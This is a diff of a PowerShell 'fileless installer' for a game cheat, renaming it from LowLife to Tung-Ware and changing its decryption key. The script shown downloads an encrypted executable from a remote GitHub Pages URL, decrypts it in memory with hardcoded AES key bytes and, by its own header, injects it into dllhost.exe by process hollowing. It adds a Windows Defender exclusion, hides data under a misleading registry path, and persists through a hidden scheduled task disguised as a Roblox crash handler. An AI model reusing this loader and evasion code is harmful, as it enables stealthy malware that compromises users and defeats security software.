@@ -1,5 +1,5 @@
-# ==============================================================================
-# LowLife Cheat Environment - Fileless Remote Installer
+﻿# ==============================================================================
+# Tung-Ware Cheat Environment - Fileless Remote Installer
 # ==============================================================================
 # Zero files written to disk. EXE decrypted in RAM and injected into dllhost.exe
 # via process hollowing. License key stored in registry. Persistence and portal
@@ -18,7 +18,7 @@ $scriptRoot = if ($MyInvocation.MyCommand.Path) { Split-Path $MyInvocation.MyCom
 # Normalize script root if it exists
 if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }
 
-$ServerBaseUrl  = "https://cc312123.github.io/lowlife/files"
+$ServerBaseUrl  = "https://cc312123.github.io/tung-ware/files"
 $KeyRegPath     = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility"
 $KeyRegName     = "Configuration"
 $LoaderTaskName = "RobloxCrashHandler"
@@ -52,7 +52,7 @@ if (-not $isAdmin) {
 }
 
 Write-Host "==========================================" -ForegroundColor Cyan
-Write-Host "   LOWLIFE SYSTEM - FILELESS INSTALLER    " -ForegroundColor Cyan
+Write-Host "   TUNG-WARE SYSTEM - FILELESS INSTALLER  " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
 # Automatically add Windows Defender exclusion for workspace to prevent hollowing blockages
@@ -101,7 +101,7 @@ if (-not $licenseKey) {
     Write-Host "License key not found in registry or key.txt. Prompting for key..." -ForegroundColor Yellow
     try {
         Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
-        $prompt = [Microsoft.VisualBasic.Interaction]::InputBox("Enter your LowLife license key:", "LowLife License Verification", "")
+        $prompt = [Microsoft.VisualBasic.Interaction]::InputBox("Enter your Tung-Ware license key:", "Tung-Ware License Verification", "")
         if ($prompt) {
             $licenseKey = $prompt.Trim()
         }
@@ -113,7 +113,7 @@ if (-not $licenseKey) {
             throw "Forms fallback"
         } catch {
             if ($Host.Name -eq "ConsoleHost" -and -not $Silent) {
-                $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
+                $licenseKey = (Read-Host "Enter your Tung-Ware license key").Trim()
             } else {
                 Write-Error "Key prompt failed in non-interactive environment."
                 Exit 1
@@ -473,9 +473,9 @@ if (Test-Path $localExe) {
     try {
         $encBytes = $wc.DownloadData("$ServerBaseUrl/RobloxCrashHandler.enc")
         
-        $DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
+        $DecKey = [byte[]](0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,
                            0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
-        $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x21,0x40)
+        $DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x54,0x55,0x4E,0x47,0x57,0x41,0x52,0x45,0x21)
         
         $aes         = [System.Security.Cryptography.Aes]::Create()
         $aes.Key     = $DecKey
@@ -619,24 +619,23 @@ objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Byp
     Write-Host "    Loader startup task registered (inline command, no file)." -ForegroundColor Green
     
     # Remove redundant bootstrapper task if it exists
-    Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
 } else {
     Write-Host "    Persistence disabled: Cleaning up any existing scheduled tasks/Run keys..." -ForegroundColor Green
     $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
     if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
     Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
     Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "LowLifePortal" -Force -ErrorAction SilentlyContinue | Out-Null
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
 }
 
 # Remove any legacy startup files from old installs
 @(
-    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.lnk",
-    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LowLifePortal.url",
-    "$env:USERPROFILE\.lowlife_bootstrap.ps1",
-    "$env:USERPROFILE\.lowlife_key",
-    "$env:USERPROFILE\.lowlife_persistence"
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
+    "$env:USERPROFILE\.tungware_bootstrap.ps1",
+    "$env:USERPROFILE\.tungware_key",
+    "$env:USERPROFILE\.tungware_persistence"
 ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }
 
 # -- Wait for loader to come up and open portal ---------------------------------
@@ -720,3 +719,4 @@ Write-Host "  SUCCESS: Fileless install complete!     " -ForegroundColor Green
 Write-Host "  Zero loose files written to disk.       " -ForegroundColor Green
 Write-Host "  Portal: http://localhost:9876/           " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Green
+
